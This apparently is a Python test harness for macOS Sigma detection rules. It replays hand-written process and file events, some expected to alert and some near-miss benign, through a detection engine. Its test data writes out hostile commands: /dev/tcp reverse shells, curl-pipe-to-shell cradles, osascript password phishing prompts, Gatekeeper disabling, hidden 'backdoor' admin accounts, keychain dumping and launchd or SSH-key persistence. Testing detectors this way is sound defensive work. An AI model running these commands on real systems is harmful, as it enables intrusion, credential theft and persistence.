"""Check macOS rule logic with the real engine: positives and near-miss negatives.

Replays hand-written Endpoint Security style events, so it needs no sensor and no
entitlement. Each case names the rule that must (or must not) alert for one
event. The engine reports a single alert per event, so rules that overlap on an
event would mask one another; each rule is therefore replayed alone against its
own cases.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

GK_GLOBAL = "Gatekeeper Globally Disabled via spctl"
XATTR = "Quarantine Attribute Removed via xattr"
OSA_PHISH = "osascript Hidden-Answer Password Prompt"
OSA_ADMIN = "osascript Privileged Shell Command with Staging Indicators"
DEV_TCP = "macOS Reverse Shell via /dev/tcp"
ACCOUNT = "Local Account Created via Directory Services"
ADMIN_GROUP = "Account Added to the macOS Admin Group"
HIDDEN = "Local Account Hidden from the Login Window"
LAUNCHCTL = "launchctl Load from User-Writable Path"
CRADLE = "Shell Download-and-Execute Pipe Cradle"
EXEC = "Unsigned or Ad-Hoc Signed Binary Executed from a Staging Directory"
KEYCHAIN = "Keychain Credential Dump via security"
PLIST = "Launch Agent or Daemon Plist Written"
PLIST_SCRIPTED = "Launch Agent or Daemon Plist Written by a Shell or Scripting Process"
KEYS = "SSH authorized_keys Written (macOS)"

RULE_FILES = {
    GK_GLOBAL: "proc_creation_macos_gatekeeper_bypass.yml",
    XATTR: "proc_creation_macos_quarantine_attribute_removed.yml",
    OSA_PHISH: "proc_creation_macos_osascript_admin_prompt.yml",
    OSA_ADMIN: "proc_creation_macos_osascript_admin_shell.yml",
    DEV_TCP: "proc_creation_macos_shell_dev_tcp_reverse_shell.yml",
    ACCOUNT: "proc_creation_macos_local_admin_account.yml",
    ADMIN_GROUP: "proc_creation_macos_admin_group_membership.yml",
    HIDDEN: "proc_creation_macos_hidden_user_account.yml",
    LAUNCHCTL: "proc_creation_macos_launchctl_susp_load.yml",
    CRADLE: "proc_creation_macos_download_execute_cradle.yml",
    EXEC: "proc_creation_macos_exec_from_world_writable.yml",
    KEYCHAIN: "proc_creation_macos_keychain_dump_security.yml",
    PLIST: "file_event_macos_launch_persistence.yml",
    PLIST_SCRIPTED: "file_event_macos_launch_persistence_scripted.yml",
    KEYS: "file_event_macos_ssh_authorized_keys.yml",
}

# (rule, Image, CommandLine, extra fields, alerts)
PROCESS_CASES = [
    # Gatekeeper: the global switch only; xattr is a separate rule.
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --master-disable", {}, True),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --global-disable", {}, True),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --status", {}, False),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --master-enable", {}, False),
    (GK_GLOBAL, "/usr/bin/xattr", "xattr -d com.apple.quarantine /tmp/app", {}, False),
    # Quarantine removal: by name or clear-all, minus managed launchers.
    (XATTR, "/usr/bin/xattr", "xattr -d com.apple.quarantine /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -dr com.apple.quarantine /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -cr /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -c /tmp/installer", {}, True),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -d com.apple.quarantine /Applications/App.app",
        {"ParentImage": "/bin/zsh"},
        True,
    ),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -d com.apple.quarantine /Applications/App.app",
        {"ParentImage": "/opt/homebrew/Homebrew/Library/Homebrew/vendor/ruby"},
        False,
    ),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -cr /Applications/App.app",
        {"ParentImage": "/usr/local/jamf/bin/jamf"},
        False,
    ),
    (XATTR, "/usr/bin/xattr", "xattr -l /Applications/App.app", {}, False),
    (XATTR, "/usr/bin/xattr", "xattr -p com.apple.quarantine /tmp/app", {}, False),
    (XATTR, "/usr/bin/xattr", "xattr -w com.apple.quarantine 0083 /tmp/app", {}, False),
    # osascript: credential prompt and privileged staging are separate.
    (
        OSA_PHISH,
        "/usr/bin/osascript",
        'osascript -e \'display dialog "Update" default answer "" with hidden answer\'',
        {},
        True,
    ),
    (OSA_PHISH, "/usr/bin/osascript", "osascript -e 'display dialog \"Done\"'", {}, False),
    (
        OSA_PHISH,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"curl http://x/a\" with administrator privileges'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        'osascript -e \'do shell script "curl -o /tmp/a http://x/a && chmod +x /tmp/a" '
        "with administrator privileges'",
        {},
        True,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"python3 setup.py\" with administrator privileges'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"curl http://x/a\"'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        'osascript -e \'display dialog "x" default answer "" with hidden answer\'',
        {},
        False,
    ),
    # /dev/tcp: Apple's bash lacks it; non-Apple bash and ksh have it; zsh never.
    (DEV_TCP, "/opt/homebrew/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/tmp/x/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/bin/ksh", "ksh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, True),
    (DEV_TCP, "/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, False),
    (DEV_TCP, "/bin/sh", "sh -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, False),
    (DEV_TCP, "/bin/zsh", "zsh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, False),
    (DEV_TCP, "/opt/homebrew/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", {}, False),
    # Accounts: creation, admin-group membership and hiding are separate.
    (ACCOUNT, "/usr/bin/dscl", "dscl . -create /Users/backdoor", {}, True),
    (ACCOUNT, "/usr/sbin/sysadminctl", "sysadminctl -addUser backdoor -password x", {}, True),
    (ACCOUNT, "/usr/bin/dscl", "dscl . -append /Groups/admin GroupMembership backdoor", {}, False),
    (ACCOUNT, "/usr/bin/dscl", "dscl . -read /Users/alice", {}, False),
    (ACCOUNT, "/usr/sbin/dseditgroup", "dseditgroup -o edit -a alice -t user admin", {}, False),
    (
        ADMIN_GROUP,
        "/usr/sbin/dseditgroup",
        "dseditgroup -o edit -a backdoor -t user admin",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/bin/dscl",
        "dscl . -append /Groups/admin GroupMembership backdoor",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -addUser backdoor -password x -admin",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -admin -addUser backdoor -password x",
        {},
        True,
    ),
    (ADMIN_GROUP, "/usr/sbin/sysadminctl", "sysadminctl -addUser guest -password x", {}, False),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -adminUser root -adminPassword x -addUser guest",
        {},
        False,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/dseditgroup",
        "dseditgroup -o edit -a alice -t user staff",
        {},
        False,
    ),
    (ADMIN_GROUP, "/usr/sbin/dseditgroup", "dseditgroup -o read admin", {}, False),
    (ADMIN_GROUP, "/usr/bin/dscl", "dscl . -read /Groups/admin GroupMembership", {}, False),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/backdoor IsHidden 1", {}, True),
    (
        HIDDEN,
        "/usr/bin/defaults",
        "defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool YES",
        {},
        True,
    ),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/alice IsHidden 0", {}, False),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/alice UserShell /bin/zsh", {}, False),
    (
        HIDDEN,
        "/usr/bin/defaults",
        "defaults read /Library/Preferences/com.apple.loginwindow Hide500Users",
        {},
        False,
    ),
    # launchctl: load/bootstrap as subcommands of a staged plist.
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /tmp/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load -w /private/tmp/a/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl bootstrap gui/501 /Users/Shared/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl unload /tmp/evil.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl bootout gui/501 /tmp/evil.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /Library/LaunchDaemons/a.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /Users/dev/tmp/a.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl list /tmp/download.plist", {}, False),
    # Cradle: the pipe target is a shell word, not a prefix of shasum.
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | bash'", {}, True),
    (CRADLE, "/bin/zsh", "zsh -c 'curl -fsSL http://x/a | sh'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a |sudo bash'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'wget -qO- http://x/a | /bin/sh -s'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | shasum -a 256'", {}, False),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | sha256sum'", {}, False),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a -o /tmp/a'", {}, False),
    # Keychain: 'arc' inside another word is not a browser name.
    (
        KEYCHAIN,
        "/usr/bin/security",
        "security find-generic-password -s Chrome -w",
        {},
        True,
    ),
    (KEYCHAIN, "/usr/bin/security", "security dump-keychain -d login.keychain", {}, True),
    (
        KEYCHAIN,
        "/usr/bin/security",
        "security find-generic-password -s search-service -w",
        {},
        False,
    ),
    # Staging execution: platform and team-signed binaries are excluded.
    (EXEC, "/tmp/payload", "/tmp/payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/private/tmp/a/payload", "payload", {"IsPlatformBinary": False, "TeamId": ""}, True),
    (EXEC, "/Users/Shared/payload", "payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/Users/alice/Downloads/app/payload", "payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/tmp/payload", "/tmp/payload", {"IsPlatformBinary": True}, False),
    (
        EXEC,
        "/tmp/payload",
        "/tmp/payload",
        {"IsPlatformBinary": False, "TeamId": "ABCDE12345"},
        False,
    ),
    (EXEC, "/usr/bin/true", "true", {"IsPlatformBinary": True}, False),
    (EXEC, "/Applications/App.app/Contents/MacOS/App", "App", {"IsPlatformBinary": False}, False),
]

# (rule, Image, TargetFilename, alerts)
FILE_CASES = [
    (PLIST, "/usr/bin/plutil", "/Users/alice/Library/LaunchAgents/com.evil.plist", True),
    (PLIST, "/tmp/dropper", "/Library/LaunchDaemons/com.evil.plist", True),
    (PLIST, "/usr/sbin/installer", "/Library/LaunchDaemons/com.vendor.helper.plist", False),
    (PLIST, "/System/Library/CoreServices/x/installd", "/Library/LaunchAgents/com.v.plist", False),
    (PLIST, "/usr/libexec/installd", "/Library/LaunchDaemons/com.vendor.plist", False),
    (
        PLIST,
        "/opt/homebrew/Homebrew/bin/brew",
        "/Library/LaunchDaemons/homebrew.mxcl.x.plist",
        False,
    ),
    (PLIST, "/usr/local/jamf/bin/jamf", "/Library/LaunchDaemons/com.jamf.plist", False),
    (PLIST, "/usr/bin/plutil", "/Library/LaunchAgents/readme.txt", False),
    (PLIST, "/usr/bin/plutil", "/System/Library/LaunchDaemons/com.apple.x.plist", False),
    (PLIST_SCRIPTED, "/bin/bash", "/Users/alice/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/bin/sh", "/Library/LaunchDaemons/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/osascript", "/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/curl", "/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/plutil", "/Users/alice/Library/LaunchAgents/com.evil.plist", False),
    (PLIST_SCRIPTED, "/bin/bash", "/Users/alice/Documents/com.evil.plist", False),
    (KEYS, "/bin/sh", "/Users/alice/.ssh/authorized_keys", True),
    (KEYS, "/usr/bin/vim", "/var/root/.ssh/authorized_keys2", True),
    (KEYS, "/usr/local/jamf/bin/jamf", "/Users/alice/.ssh/authorized_keys", False),
    (KEYS, "/bin/sh", "/Users/alice/.ssh/known_hosts", False),
    (KEYS, "/bin/sh", "/Users/alice/backup/authorized_keys", False),
]


def process_event(index, image, command_line, extra):
    fields = {"ProcessId": str(index), "Image": image, "CommandLine": command_line}
    fields.update(extra)
    return {"category": "Process", "event_id": 1, "fields": fields}


def file_event(index, image, path):
    return {
        "category": "File",
        "event_id": 11,
        "fields": {"ProcessId": str(index), "Image": image, "TargetFilename": path},
    }


def replay(engine, repo, rule, cases):
    timestamp = "2026-10-08T08:00:00Z"
    events = []
    expected = set()
    for index, (alerts, build) in enumerate(cases, 1):
        event = build(index)
        event.update(
            event_time=timestamp,
            ingest_seq=index,
            platform="macos",
            provider="esf",
            opcode=1,
        )
        events.append(event)
        if alerts:
            expected.add(index)

    with tempfile.TemporaryDirectory(prefix="rustinel-macos-logic-replay-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        source = next((repo / "rules/sigma/macos").glob(RULE_FILES[rule]))
        shutil.copyfile(source, rules / source.name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": json.loads(
                        (repo / "compatibility/engine.json").read_text()
                    )["version"],
                    "platform": "macos",
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=30,
            capture_output=True,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {int(alert["process.pid"]) for alert in alerts if alert["rule.name"] == rule}
        if actual != expected:
            raise RuntimeError(
                f"{rule}: missing alerts for cases {sorted(expected - actual)}; "
                f"unexpected alerts for cases {sorted(actual - expected)}"
            )
    return len(expected)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]

    grouped = {rule: [] for rule in RULE_FILES}
    for rule, image, command_line, extra, alerts in PROCESS_CASES:
        grouped[rule].append(
            (alerts, lambda i, a=image, c=command_line, x=extra: process_event(i, a, c, x))
        )
    for rule, image, path, alerts in FILE_CASES:
        grouped[rule].append((alerts, lambda i, a=image, p=path: file_event(i, a, p)))

    total = positives = 0
    for rule, cases in grouped.items():
        positives += replay(engine, repo, rule, cases)
        total += len(cases)
    print(f"Passed {total} logic replay cases ({positives} expected alerts).")


if __name__ == "__main__":
    main()
